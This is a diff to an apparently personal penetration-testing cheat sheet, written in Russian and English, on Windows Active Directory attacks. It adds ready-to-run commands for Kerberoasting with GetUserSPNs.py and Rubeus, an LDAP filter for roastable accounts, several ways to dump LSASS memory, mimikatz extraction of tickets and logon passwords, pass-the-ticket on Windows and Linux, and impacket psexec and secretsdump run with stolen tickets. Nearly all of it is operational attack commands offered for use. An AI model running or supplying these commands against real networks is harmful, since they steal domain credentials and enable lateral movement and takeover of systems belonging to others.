@@ -97,15 +97,30 @@ https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
 
 ## KERBEROASTING (Credentials)
 1) GetUserSPNs.py domain.local/user:password - RECON SPNs
-2) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request
-3) Windows: setspn -T TestDomain -Q */*
-4) Windows: загружаем билеты в память для дальнейних действий.
+2) GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.com/username
+3) GetUserSPNs.py domain.local/user:password -dc-ip [DC IP] -request
+4) Windows: setspn -T TestDomain -Q */* 
+            - загружаем билеты в память для дальнейних действий.
             - Add-Type -AssemblyName System.IdentityModel
             - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"
             - Проверяем, что билет загружен в память: klist
             - Invoke-Mimikatz –Command '" kerberos::list"' /export (модуль PowerSploit)
             - Софт для перебора билета tgsrepcrack.py https://github.com/nidem/kerberoast
             - После взлома пароля: net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password1
+ 5) Windows: Rubeus.exe kerberoast /outfile:hashes.txt
+ 
+Всех пользователей, у которых можно выгрузить TGS-билет, можно найти поисковым LDAP-фильтром: (&(samAccountType=805306368)(servicePrincipalName=*))
+
+## Извлечение Kerberos-билетов через дамп виртуальной памяти:
+Три способа дампа памяти:
+- taskmgr.exe → ПКМ по lsass.exe → дамп памяти;
+- rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
+- procdump.exe -ma lsass.exe /accepteula.
+
+Если дамп удалось создать, то билеты можно безопасно извлечь уже на своей стороне:
+mimikatz.exe
+sekurlsa::Minidump lsass.dmp
+sekurlsa::tickets /export
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ## GPP Attack (Compromised user, member of AD) https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
@@ -308,6 +323,45 @@ evil-winrm -i target -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0
 
 WINDOWS PASS-THE-HASH:
 mimikatz; //securlsa::pth /user:username /domain:domain /ntlm:NTLM_HASH /run:cmd
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+## PASS-THE-TICKET
+Если у нас имеется Kerberos-билет TGT (билет пользователя), то мы можем применить егодля аутентификации. 
+При этом Linux и Windows используют разные форматы — ccache и kirbi соответственно.
+
+WINDOWS:
+mimikatz# kerberos::ptt c:\path\to\tgt.kirbi
+mimikatz# kerberos::ptс c:\path\to\tgt.ccache
+После импорта используем любую нужную нам программу без указания каких‐либо ключей: dir \\dc.company.org\c$
+
+Под Linux делаем Pass-the-Ticket в формате ccache:
+cp tgt.ccache /tmp/krb5cc_0
+klist
+Конертируем билет в ccache: kekeo.exe "misc::convert ccache ticket.kirbi" "exit"
+После импорта билеты в Linux используем следующим образом: 
+  - smbclient -k //dc.company.org/c$ 
+  - winexe -k yes -N //dc.company.org cmd
+  
+Инструменты из набора impacket могут использовать билеты без предварительного импорта: Чтобы использовать Kerberos-билет при аутентификации, нужно обращаться к target по имени, а не по IP-адресу.
+
+KRB5CCNAME=`pwd`/tgt.ccache psexec.py -k -dc-ip 10.0.0.1 target.domain.com
+KRB5CCNAME=`pwd`/tgt.ccache secretsdump.py -k -no-pass target.domain.com
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+## Учетные данные запущенных сессий:
+Доменные учетные записи также находятся в памяти процесса, это касаетсятолько активных в данный момент сессий. 
+
+qproccess *; //список пользователей и их процессов.
+mimikatz.exe privilege::debug sekurlsa::logonPasswords
+----------------------------------------------------------------------------------------------------------------------------------------------------------
+## Извлечение через дамп виртуальной памяти:
+sekurlsa::Minidump lsassdump.dmp
+sekurlsa::logonPasswords
+
+
+
+
+
+
+
 
 
 
